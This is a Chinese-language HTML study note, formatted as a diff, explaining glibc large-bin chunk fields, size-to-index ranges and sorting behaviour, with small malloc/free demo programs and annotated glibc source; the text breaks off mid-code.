+<li>PREV_INUSE&#xFF0C;&#x8BB0;&#x5F55;&#x524D;&#x4E00;&#x4E2A; chunk &#x5757;&#x662F;&#x5426;&#x88AB;&#x5206;&#x914D;&#x3002;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#xFF0C;&#x5806;&#x4E2D;&#x7B2C;&#x4E00;&#x4E2A;&#x88AB;&#x5206;&#x914D;&#x7684;&#x5185;&#x5B58;&#x5757;&#x7684; size &#x5B57;&#x6BB5;&#x7684; P &#x4F4D;&#x90FD;&#x4F1A;&#x88AB;&#x8BBE;&#x7F6E;&#x4E3A; 1&#xFF0C;&#x4EE5;&#x4FBF;&#x4E8E;&#x9632;&#x6B62;&#x8BBF;&#x95EE;&#x524D;&#x9762;&#x7684;&#x975E;&#x6CD5;&#x5185;&#x5B58;&#x3002;&#x5F53;&#x4E00;&#x4E2A; chunk &#x7684; size &#x7684; P &#x4F4D;&#x4E3A; 0 &#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x80FD;&#x901A;&#x8FC7; prev_size &#x5B57;&#x6BB5;&#x6765;&#x83B7;&#x53D6;&#x4E0A;&#x4E00;&#x4E2A; chunk &#x7684;&#x5927;&#x5C0F;&#x4EE5;&#x53CA;&#x5730;&#x5740;&#x3002;&#x8FD9;&#x4E5F;&#x65B9;&#x4FBF;&#x8FDB;&#x884C;&#x7A7A;&#x95F2; chunk &#x4E4B;&#x95F4;&#x7684;&#x5408;&#x5E76;&#x3002;</li>
+</ul>
+</li>
+<li><p><strong>fd&#xFF0C;bk</strong>&#xFF0C; chunk &#x5904;&#x4E8E;&#x5206;&#x914D;&#x72B6;&#x6001;&#x65F6;&#xFF0C;&#x4ECE; fd &#x5B57;&#x6BB5;&#x5F00;&#x59CB;&#x662F;&#x7528;&#x6237;&#x7684;&#x6570;&#x636E;&#x3002;chunk &#x7A7A;&#x95F2;&#x65F6;&#xFF0C;&#x4F1A;&#x88AB;&#x6DFB;&#x52A0;&#x5230;&#x5BF9;&#x5E94;&#x7684;&#x7A7A;&#x95F2;&#x7BA1;&#x7406;&#x94FE;&#x8868;&#x4E2D;&#xFF0C;&#x5176;&#x5B57;&#x6BB5;&#x7684;&#x542B;&#x4E49;&#x5982;&#x4E0B;</p>
+<ul>
+<li>fd &#x6307;&#x5411;&#x4E0B;&#x4E00;&#x4E2A;&#xFF08;&#x975E;&#x7269;&#x7406;&#x76F8;&#x90BB;&#xFF09;&#x7A7A;&#x95F2;&#x7684; chunk</li>
+<li>bk &#x6307;&#x5411;&#x4E0A;&#x4E00;&#x4E2A;&#xFF08;&#x975E;&#x7269;&#x7406;&#x76F8;&#x90BB;&#xFF09;&#x7A7A;&#x95F2;&#x7684; chunk</li>
+<li>&#x901A;&#x8FC7; fd &#x548C; bk &#x53EF;&#x4EE5;&#x5C06;&#x7A7A;&#x95F2;&#x7684; chunk &#x5757;&#x52A0;&#x5165;&#x5230;&#x7A7A;&#x95F2;&#x7684; chunk &#x5757;&#x94FE;&#x8868;&#x8FDB;&#x884C;&#x7EDF;&#x4E00;&#x7BA1;&#x7406;</li>
+</ul>
+</li>
+<li><p><strong>fd_nextsize&#xFF0C; bk_nextsize</strong>&#xFF0C;&#x4E5F;&#x662F;&#x53EA;&#x6709; chunk &#x7A7A;&#x95F2;&#x7684;&#x65F6;&#x5019;&#x624D;&#x4F7F;&#x7528;&#xFF0C;&#x4E0D;&#x8FC7;&#x5176;&#x7528;&#x4E8E;&#x8F83;&#x5927;&#x7684; chunk&#xFF08;large chunk&#xFF09;&#x3002;</p>
+<ul>
+<li>fd_nextsize &#x6307;&#x5411;&#x524D;&#x4E00;&#x4E2A;&#x4E0E;&#x5F53;&#x524D; chunk &#x5927;&#x5C0F;&#x4E0D;&#x540C;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x7A7A;&#x95F2;&#x5757;&#xFF0C;&#x4E0D;&#x5305;&#x542B; bin &#x7684;&#x5934;&#x6307;&#x9488;&#x3002;</li>
+<li>bk_nextsize &#x6307;&#x5411;&#x540E;&#x4E00;&#x4E2A;&#x4E0E;&#x5F53;&#x524D; chunk &#x5927;&#x5C0F;&#x4E0D;&#x540C;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x7A7A;&#x95F2;&#x5757;&#xFF0C;&#x4E0D;&#x5305;&#x542B; bin &#x7684;&#x5934;&#x6307;&#x9488;&#x3002;</li>
+<li>&#x4E00;&#x822C;&#x7A7A;&#x95F2;&#x7684; large chunk &#x5728; fd &#x7684;&#x904D;&#x5386;&#x987A;&#x5E8F;&#x4E2D;&#xFF0C;&#x6309;&#x7167;&#x7531;&#x5927;&#x5230;&#x5C0F;&#x7684;&#x987A;&#x5E8F;&#x6392;&#x5217;&#x3002;<strong>&#x8FD9;&#x6837;&#x505A;&#x53EF;&#x4EE5;&#x907F;&#x514D;&#x5728;&#x5BFB;&#x627E;&#x5408;&#x9002; chunk &#x65F6;&#x6328;&#x4E2A;&#x904D;&#x5386;&#x3002;</strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="large-bin&#x7684;&#x5927;&#x5C0F;&#x8303;&#x56F4;">large bin&#x7684;&#x5927;&#x5C0F;&#x8303;&#x56F4;</h4>
+<p> size&#x4E0E;index&#x5BF9;&#x5E94;&#x7684;&#x5173;&#x7CFB; </p>
+<pre><code>size    index
+[0x400 , 0x440)    64
+[0x440 , 0x480)    65
+[0x480 , 0x4C0)    66
+[0x4C0 , 0x500)    67
+[0x500 , 0x540)    68
+&#x7B49;&#x5DEE; 0x40    &#x2026;
+[0xC00 , 0xC40)    96
+[0xC40 , 0xE00)    97
+[0xE00 , 0x1000)    98
+[0x1000 , 0x1200)    99
+[0x1200 , 0x1400)    100
+[0x1400 , 0x1600)    101
+&#x7B49;&#x5DEE; 0x200    &#x2026;
+[0x2800 , 0x2A00)    111
+[0x2A00 , 0x3000)    112
+[0x3000 , 0x4000)    113
+[0x4000 , 0x5000)    114
+&#x7B49;&#x5DEE; 0x1000    &#x2026;
+[0x9000 , 0xA000)    119
+[0xA000 , 0x10000)    120
+[0x10000 , 0x18000)    121
+[0x18000 , 0x20000)    122
+[0x20000 , 0x28000)    123
+[0x28000 , 0x40000)    124
+[0x40000 , 0x80000)    125
+[0x80000 , &#x2026;. )    126
+</code></pre><h4 id="large-bin&#x7684;&#x884C;&#x4E3A;">large bin&#x7684;&#x884C;&#x4E3A;</h4>
+<p>&#x5728;&#x76F8;&#x540C;&#x7684;index&#x4E0B; </p>
+<ul>
+<li><p>largebin&#x7684;&#x63D2;&#x5165;&#x987A;&#x5E8F;&#x4E0D;&#x518D;&#x662F;LIFO&#x6216;FILO&#xFF0C;&#x800C;&#x662F;&#x4E00;&#x79CD;&#x5168;&#x65B0;&#x7684;&#x65B9;&#x5F0F;&#x3002;</p>
+</li>
+<li><p>&#x6309;&#x7167;&#x5927;&#x5C0F;&#x4ECE;&#x5927;&#x5230;&#x5C0F;&#x6392;&#x5E8F;</p>
+</li>
+<li>&#x82E5;&#x5927;&#x5C0F;&#x76F8;&#x540C;,&#x6309;&#x7167;free&#x65F6;&#x95F4;&#x6392;&#x5E8F;</li>
+<li>&#x82E5;&#x5E72;&#x4E2A;&#x5927;&#x5C0F;&#x76F8;&#x540C;&#x7684;&#x5806;&#x5757;,&#x53EA;&#x6709;&#x9996;&#x5806;&#x5757;&#x7684;<code>fd_nextsize</code>&#x548C;<code>bk_nextsize</code>&#x4F1A;&#x6307;&#x5411;&#x5176;&#x4ED6;&#x5806;&#x5757;,&#x540E;&#x9762;&#x7684;&#x5806;&#x5757;&#x7684;<code>fd_nextsize</code>&#x548C;<code>bk_nextsize</code>&#x5747;&#x4E3A;0</li>
+<li>size&#x6700;&#x5927;&#x7684;chunk&#x7684;<code>bk_nextsize</code>&#x6307;&#x5411;&#x6700;&#x5C0F;&#x7684;chunk; size&#x6700;&#x5C0F;&#x7684;chunk&#x7684;<code>fd_nextsize</code>&#x6307;&#x5411;&#x6700;&#x5927;&#x7684;chunk</li>
+</ul>
+<h4 id="large-bin&#x884C;&#x4E3A;&#x793A;&#x4F8B;1">large bin&#x884C;&#x4E3A;&#x793A;&#x4F8B;1</h4>
+<p>&#x5927;&#x5C0F;&#x4E0D;&#x540C;&#x4F46;&#x5C5E;&#x4E8E;&#x4E00;&#x4E2A;bin&#x7684;&#x60C5;&#x51B5;</p>
+<p>&#x653E;&#x5165;&#x540C;&#x4E00;large bin&#x4E2D;&#x7684;chunk&#x4F1A;&#x6309;&#x7167;&#x5927;&#x5C0F;&#x6392;&#x5217;</p>
+<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
+</span>{
+    <span class="hljs-keyword">char</span> *gap;
+
+    <span class="hljs-keyword">char</span> *ptr0=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//A</span>
+    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);
+    <span class="hljs-keyword">char</span> *ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//B</span>
+    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);
+    <span class="hljs-keyword">char</span> *ptr2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//C</span>
+    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);
+    <span class="hljs-keyword">char</span> *ptr3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x430</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//D</span>
+    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);
+    <span class="hljs-built_in">free</span>(ptr2);
+    <span class="hljs-built_in">free</span>(ptr3);
+    <span class="hljs-built_in">free</span>(ptr0);
+    <span class="hljs-built_in">free</span>(ptr1);
+
+    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x440</span>); <span class="hljs-comment">//trigger that sort largebin from unsorted bin to largebins</span>
+
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>&#x6267;&#x884C;&#x5B8C;malloc(0x440)&#x540E;&#xFF0C;unsorted bin&#x88AB;&#x6E05;&#x7A7A;</p>
+<p><img src="1.png" alt=""></p>
+<p><strong>&#x5404;chunk fd&#x548C;bk&#x7684;&#x6307;&#x5411;&#x60C5;&#x51B5;</strong></p>
+<p><img src="2.png" alt=""></p>
+<p><strong>&#x5404;chunk fd_nextsize&#x548C;bk_nextsize&#x7684;&#x6307;&#x5411;&#x60C5;&#x51B5;</strong></p>
+<p><img src="3.png" alt=""></p>
+<h4 id="large-bin&#x884C;&#x4E3A;&#x793A;&#x4F8B;2">large bin&#x884C;&#x4E3A;&#x793A;&#x4F8B;2</h4>
+<p>chunk&#x5927;&#x5C0F;&#x76F8;&#x540C;&#x7684;&#x60C5;&#x51B5;</p>
+<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
+</span>{
+    <span class="hljs-keyword">char</span> *gap;
+
+    <span class="hljs-keyword">char</span> *ptr0=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//A</span>
+    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);
+    <span class="hljs-keyword">char</span> *ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//B</span>
+    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);
+    <span class="hljs-keyword">char</span> *ptr2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//C</span>
+    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);
+    <span class="hljs-keyword">char</span> *ptr3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//D</span>
+    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);
+
+
+    <span class="hljs-built_in">free</span>(ptr2);  <span class="hljs-comment">//C</span>
+    <span class="hljs-built_in">free</span>(ptr3);  <span class="hljs-comment">//D</span>
+    <span class="hljs-built_in">free</span>(ptr0);  <span class="hljs-comment">//A</span>
+    <span class="hljs-built_in">free</span>(ptr1); <span class="hljs-comment">//B</span>
+
+    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x440</span>); <span class="hljs-comment">//trigger that sort largebin from unsorted bin to largebins</span>
+
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>&#x6267;&#x884C;&#x5B8C;malloc(0x440)</p>
+<p><img src="4.png" alt=""></p>
+<p><strong>&#x5404;chunk fd&#x548C;bk&#x7684;&#x6307;&#x5411;&#x60C5;&#x51B5;</strong></p>
+<p><img src="5.png" alt=""></p>
+<p><strong>&#x5404;chunk fd_nextsize&#x548C;bk_nextsize&#x7684;&#x6307;&#x5411;&#x60C5;&#x51B5;</strong></p>
+<p><img src="6.png" alt=""></p>
+<h4 id="large-bin&#x884C;&#x4E3A;&#x793A;&#x4F8B;3">large bin&#x884C;&#x4E3A;&#x793A;&#x4F8B;3</h4>
+<p> &#x65E2;&#x5B58;&#x5728;&#x76F8;&#x540C;&#x5927;&#x5C0F;&#x7684;&#x5806;&#x5757;&#x53C8;&#x5B58;&#x5728;&#x4E0D;&#x540C;&#x5927;&#x5C0F;&#x7684;&#x5806;&#x5757;&#x7BA1;&#x7406;&#x793A;&#x4F8B; </p>
+<pre><code>#include&lt;stdio.h&gt;
+
+int main()
+{
+    char *gap;
+
+    char *ptr0=malloc(0x400-0x10); //A
+    gap=malloc(0x10);
+    char *ptr1=malloc(0x410-0x10); //B
+    gap=malloc(0x10);
+    char *ptr2=malloc(0x420-0x10); //C
+    gap=malloc(0x10);
+    char *ptr3=malloc(0x430-0x10); //D
+    gap=malloc(0x10);
+    char *ptr4=malloc(0x400-0x10); //E
+    gap=malloc(0x10);
+    char *ptr5=malloc(0x410-0x10); //F
+    gap=malloc(0x10);
+    char *ptr6=malloc(0x420-0x10); //G
+    gap=malloc(0x10);
+    char *ptr7=malloc(0x430-0x10); //H
+    gap=malloc(0x10);
+
+    free(ptr2); //C
+    free(ptr3); //D
+    free(ptr0); //A
+    free(ptr1); //B
+    free(ptr7); //H
+    free(ptr6); //G
+    free(ptr5); //F
+    free(ptr4); //E
+
+    malloc(0x440); //trigger that sort largebin from unsorted bin to largebins
+
+    return 0;
+}
+</code></pre><p><strong>malloc(0x400)&#x540E;&#x5404;chunk fd_nextsize&#x548C;bk_nextsize&#x7684;&#x6307;&#x5411;&#x60C5;&#x51B5;</strong></p>
+<p><img src="7.png" alt=""></p>
+<h4 id="largebin-chunk&#x4ECE;unsorted-bin&#x4E2D;&#x53D6;&#x51FA;&#x6E90;&#x7801;">largebin chunk&#x4ECE;unsorted bin&#x4E2D;&#x53D6;&#x51FA;&#x6E90;&#x7801;</h4>
+<p>&#x8FD9;&#x4E2A;&#x5E08;&#x5085;&#x603B;&#x7ED3;&#x7684;&#x592A;&#x597D;&#xFF0C;&#x5B9E;&#x5728;&#x5FCD;&#x4E0D;&#x4F4F;&#x6284;&#x4F5C;&#x4E1A;</p>
+<pre><code class="lang-c"><span class="hljs-comment">/* place chunk in bin */</span>
+
+          <span class="hljs-keyword">if</span> (in_smallbin_range (size))
+            {
+              ...  <span class="hljs-comment">// chunk&#x4E3A;smallbin&#xFF0C;&#x653E;&#x5165;&#x5230;smallbin&#x4E2D;</span>
+            }
+          <span class="hljs-keyword">else</span>
+            {
+              victim_index = largebin_index (size);<span class="hljs-comment">//&#x7B2C;&#x4E00;&#x6B65;&#xFF0C;&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x8981;&#x63D2;&#x5165;&#x7684;chunk&#x5BF9;&#x5E94;&#x7684;index</span>
+              bck = bin_at (av, victim_index); <span class="hljs-comment">//&#x5F53;&#x524D;index&#x4E2D;&#x6700;&#x5C0F;&#x7684;chunk</span>
+              fwd = bck-&gt;fd;                   <span class="hljs-comment">//&#x5F53;&#x524D;index&#x4E2D;&#x6700;&#x5927;&#x7684;chunk</span>
+
+              <span class="hljs-comment">/* maintain large bins in sorted order */</span>
+              <span class="hljs-keyword">if</span> (fwd != bck)
+                { <span class="hljs-comment">// &#x8BE5;chunk&#x5BF9;&#x5E94;&#x7684;largebin index&#x4E2D;&#x4E0D;&#x4E3A;&#x7A7A;</span>
+                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span>
+                  size |= PREV_INUSE;
+                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span>
+                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);
+                  <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &lt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (bck-&gt;bk-&gt;size)) <span class="hljs-comment">//&#x7B2C;&#x4E09;&#x6B65;&#xFF0C;&#x5982;&#x679C;&#x8981;&#x63D2;&#x5165;&#x7684;chunk&#x7684;size&#x5C0F;&#x4E8E;&#x5F53;&#x524D;index&#x4E2D;&#x6700;&#x5C0F;chunk&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x5219;&#x76F4;&#x63A5;&#x63D2;&#x5165;&#x5230;&#x6700;&#x540E;&#x9762;&#x3002;</span>
+                    {
+                      fwd = bck;
+                      bck = bck-&gt;bk;
+
+                      victim-&gt;fd_nextsize = fwd-&gt;fd;
+                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;
+                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
+                    }
+                  <span class="hljs-keyword">else</span>
+                    {
+                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);
+                      <span class="hljs-keyword">while</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size &lt; fwd-&gt;size) <span class="hljs-comment">//&#x7B2C;&#x56DB;&#x6B65;&#xFF0C;&#x5982;&#x679C;&#x63D2;&#x5165;&#x7684;chunk&#x4E0D;&#x4E3A;&#x6700;&#x5C0F;&#xFF0C;&#x5219;&#x901A;&#x8FC7;`fd_nextsize`&#x4ECE;&#x5927;&#x5230;&#x5C0F;&#x904D;&#x5386;chunk&#xFF0C;&#x627E;&#x5230;&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E;&#x8981;&#x63D2;&#x5165;chunk&#x7684;&#x4F4D;&#x7F6E;</span>
+                        {
+                          fwd = fwd-&gt;fd_nextsize;
+                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);
+                        }
+
+                      <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size == (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) fwd-&gt;size)
+                        <span class="hljs-comment">/* Always insert in the second position.  */</span>
+                        fwd = fwd-&gt;fd; <span class="hljs-comment">//&#x7B2C;&#x4E94;&#x6B65;&#xFF0C;&#x5982;&#x679C;&#x5B58;&#x5728;&#x5806;&#x5934;&#xFF0C;&#x5219;&#x63D2;&#x5165;&#x5230;&#x5806;&#x5934;&#x7684;&#x4E0B;&#x4E00;&#x4E2A;&#x8282;&#x70B9;</span>
+                      <span class="hljs-keyword">else</span>
+                        { <span class="hljs-comment">//&#x7B2C;&#x516D;&#x6B65;&#xFF0C;&#x5426;&#x5219;&#x8FD9;&#x4E2A;chunk&#x5C06;&#x4F1A;&#x6210;&#x4E3A;&#x5806;&#x5934;&#xFF0C;`bk_nextsize`&#x548C;`fd_nextsize`&#x5C06;&#x88AB;&#x7F6E;&#x4F4D;</span>
+                          victim-&gt;fd_nextsize = fwd;
+                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;
+                          fwd-&gt;bk_nextsize = victim;
+                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
+                        }
+                      bck = fwd-&gt;bk;
+                    }
+                }
+              <span class="hljs-keyword">else</span>   <span class="hljs-comment">//&#x7B2C;&#x4E8C;&#x6B65;&#xFF0C;chunk&#x5BF9;&#x5E94;&#x7684;largebin index&#x4E2D;&#x4E3A;&#x7A7A;</span>
+                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;
+            }
+
+          mark_bin (av, victim_index);
+          <span class="hljs-comment">//&#x8BBE;&#x7F6E;fd&#x4E0E;bk&#x5B8C;&#x6210;&#x63D2;&#x5165;</span>
+          victim-&gt;bk = bck; 
+          victim-&gt;fd = fwd;
+          fwd-&gt;bk = victim;
+          bck-&gt;fd = victim;
+          ...
+        }
+</code></pre>
+<p>&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x53EF;&#x4EE5;&#x603B;&#x7ED3;&#x4E3A;&#xFF1A;</p>
+<ol>
+<li>&#x627E;&#x5230;&#x5F53;&#x524D;&#x8981;&#x63D2;&#x5165;&#x7684;chunk&#x5BF9;&#x5E94;&#x7684;largebin&#x7684;index&#xFF0C;&#x5E76;&#x5B9A;&#x4F4D;&#x8BE5;index&#x4E2D;&#x7684;&#x6700;&#x5C0F;&#x7684;chunk<code>bck</code>&#x548C;&#x6700;&#x5927;&#x7684;chunk<code>fwd</code>&#x3002;</li>
+<li>&#x5982;&#x679C;<code>fwd</code>&#x7B49;&#x4E8E;<code>bck</code>&#xFF0C;&#x8868;&#x660E;&#x5F53;&#x524D;&#x94FE;&#x8868;&#x4E3A;&#x7A7A;&#xFF0C;&#x5219;&#x76F4;&#x63A5;&#x5C06;&#x8BE5;chunk&#x63D2;&#x5165;&#xFF0C;&#x5E76;&#x8BBE;&#x7F6E;&#x8BE5;chunk&#x4E3A;&#x8BE5;&#x5927;&#x5C0F;&#x5806;&#x5757;&#x7684;&#x5806;&#x5934;&#xFF0C;&#x5C06;<code>bk_nextsize</code>&#x548C;<code>fd_nextsize</code>&#x8D4B;&#x503C;&#x4E3A;&#x5B83;&#x672C;&#x8EAB;&#x3002;</li>
+<li>&#x5982;&#x679C;<code>fwd</code>&#x4E0D;&#x7B49;&#x4E8E;<code>bck</code>&#xFF0C;&#x8868;&#x660E;&#x5F53;&#x524D;&#x94FE;&#x8868;&#x5DF2;&#x7ECF;&#x5B58;&#x5728;chunk&#xFF0C;&#x8981;&#x505A;&#x7684;&#x5C31;&#x662F;&#x627E;&#x5230;&#x5F53;&#x524D;chunk&#x5BF9;&#x5E94;&#x7684;&#x4F4D;&#x7F6E;&#x5C06;&#x5176;&#x63D2;&#x5165;&#x3002;&#x9996;&#x5148;&#x5224;&#x65AD;&#x5176;&#x5927;&#x5C0F;&#x662F;&#x5426;&#x5C0F;&#x4E8E;&#x6700;&#x5C0F;chunk&#x7684;size&#xFF0C;<code>(size) &lt; (bck-&gt;bk-&gt;size)</code>&#xFF0C;&#x5982;&#x679C;&#x5C0F;&#x4E8E;&#x5219;&#x8BF4;&#x660E;&#x8BE5;chunk&#x4E3A;&#x5F53;&#x524D;&#x94FE;&#x8868;&#x4E2D;&#x6700;&#x5C0F;&#x7684;chunk&#xFF0C;&#x5373;&#x63D2;&#x5165;&#x4F4D;&#x7F6E;&#x5728;&#x94FE;&#x8868;&#x672B;&#x5C3E;&#xFF0C;&#x65E0;&#x9700;&#x904D;&#x5386;&#x94FE;&#x8868;&#xFF0C;&#x76F4;&#x63A5;&#x63D2;&#x5165;&#x5230;&#x94FE;&#x8868;&#x7684;&#x672B;&#x5C3E;&#xFF0C;&#x4E14;&#x8BE5;chunk&#x6CA1;&#x6709;&#x5BF9;&#x5E94;&#x7684;&#x5806;&#x5934;&#xFF0C;&#x8BBE;&#x7F6E;&#x8BE5;chunk&#x4E3A;&#x76F8;&#x5E94;&#x5806;&#x5927;&#x5C0F;&#x5806;&#x7684;&#x5806;&#x5934;&#xFF0C;&#x5C06;<code>bk_nextsize</code>&#x6307;&#x5411;&#x6BD4;&#x5B83;&#x5927;&#x7684;&#x5806;&#x5934;&#xFF0C;<code>fd_nextsize</code>&#x6307;&#x5411;&#x53CC;&#x94FE;&#x8868;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x8282;&#x70B9;&#x5373;&#x6700;&#x5927;&#x7684;&#x5806;&#x5934;&#x3002;</li>
+<li>&#x5982;&#x679C;&#x5F53;&#x524D;chunk&#x7684;size&#x4E0D;&#x662F;&#x6700;&#x5C0F;&#x7684;chunk&#xFF0C;&#x5219;&#x4ECE;&#x53CC;&#x94FE;&#x8868;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x8282;&#x70B9;&#x5373;&#x6700;&#x5927;&#x7684;chunk&#x7684;&#x5806;&#x5934;&#x5F00;&#x59CB;&#x904D;&#x5386;&#xFF0C;&#x901A;&#x8FC7;<code>fd_nextsize</code>&#x8FDB;&#x884C;&#x904D;&#x5386;&#xFF0C;&#x7531;&#x4E8E;<code>fd_nextsize</code>&#x6307;&#x5411;&#x7684;&#x662F;&#x6BD4;&#x5F53;&#x524D;&#x5806;&#x5934;&#x5C0F;&#x7684;&#x5806;&#x5934;&#xFF0C;&#x56E0;&#x6B64;&#x53EF;&#x4EE5;&#x52A0;&#x5FEB;&#x904D;&#x5386;&#x901F;&#x5EA6;&#x3002;&#x76F4;&#x5230;&#x627E;&#x5230;&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E;&#x8981;&#x63D2;&#x5165;&#x7684;chunk&#x7684;size&#x3002;</li>
+<li>&#x5982;&#x679C;&#x627E;&#x5230;&#x7684;chunk&#x7684;size&#x7B49;&#x4E8E;&#x8981;&#x63D2;&#x5165;chunk&#x7684;size&#xFF0C;&#x5219;&#x8BF4;&#x660E;&#x5F53;&#x524D;&#x8981;&#x63D2;&#x5165;&#x7684;chunk&#x7684;size&#x5DF2;&#x7ECF;&#x5B58;&#x5728;&#x5806;&#x5934;&#xFF0C;&#x90A3;&#x4E48;&#x53EA;&#x9700;&#x5C06;&#x8BE5;chunk&#x63D2;&#x5165;&#x5230;&#x5806;&#x5934;&#x7684;&#x4E0B;&#x4E00;&#x4E2A;&#x8282;&#x70B9;&#x3002;</li>
+<li>&#x5982;&#x679C;&#x627E;&#x5230;&#x7684;chunk&#x7684;size&#x5C0F;&#x4E8E;&#x5F53;&#x524D;&#x8981;&#x63D2;&#x5165;chunk&#x7684;size&#xFF0C;&#x5219;&#x8BF4;&#x660E;&#x5F53;&#x524D;&#x63D2;&#x5165;&#x7684;chunk&#x4E0D;&#x5B58;&#x5728;&#x5806;&#x5934;&#xFF0C;&#x56E0;&#x6B64;&#x8BE5;chunk&#x4F1A;&#x6210;&#x4E3A;&#x5806;&#x5934;&#x63D2;&#x5165;&#x5230;&#x8BE5;&#x4F4D;&#x7F6E;&#xFF0C;&#x8BBE;&#x7F6E;<code>fd_nextsize</code>&#x4E0E;<code>bk_nextsize</code>&#x3002;</li>
+</ol>
+<h4 id="&#x4ECE;large-bin&#x4E2D;&#x53D6;chunk&#x7684;&#x6E90;&#x7801;">&#x4ECE;large bin&#x4E2D;&#x53D6;chunk&#x7684;&#x6E90;&#x7801;</h4>
+<pre><code class="lang-c"> <span class="hljs-comment">/*
+         If a large request, scan through the chunks of current bin in
+         sorted order to find smallest that fits.  Use the skip list for this.
+       */</span>
+      <span class="hljs-keyword">if</span> (!in_smallbin_range (nb))
+        {
+          bin = bin_at (av, idx); <span class="hljs-comment">//&#x627E;&#x5230;&#x7533;&#x8BF7;&#x7684;size&#x5BF9;&#x5E94;&#x7684;largebin&#x94FE;&#x8868;</span>
+
+          <span class="hljs-comment">/* skip scan if empty or largest chunk is too small */</span>
+          <span class="hljs-keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;
+              (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (victim-&gt;size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb)) <span class="hljs-comment">//&#x7B2C;&#x4E00;&#x6B65;&#xFF0C;&#x5224;&#x65AD;&#x94FE;&#x8868;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x7ED3;&#x70B9;&#xFF0C;&#x5373;&#x6700;&#x5927;&#x7684;chunk&#x662F;&#x5426;&#x5927;&#x4E8E;&#x8981;&#x7533;&#x8BF7;&#x7684;size</span>
+            {
+              victim = victim-&gt;bk_nextsize; 
+              <span class="hljs-keyword">while</span> (((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size = chunksize (victim)) &lt;
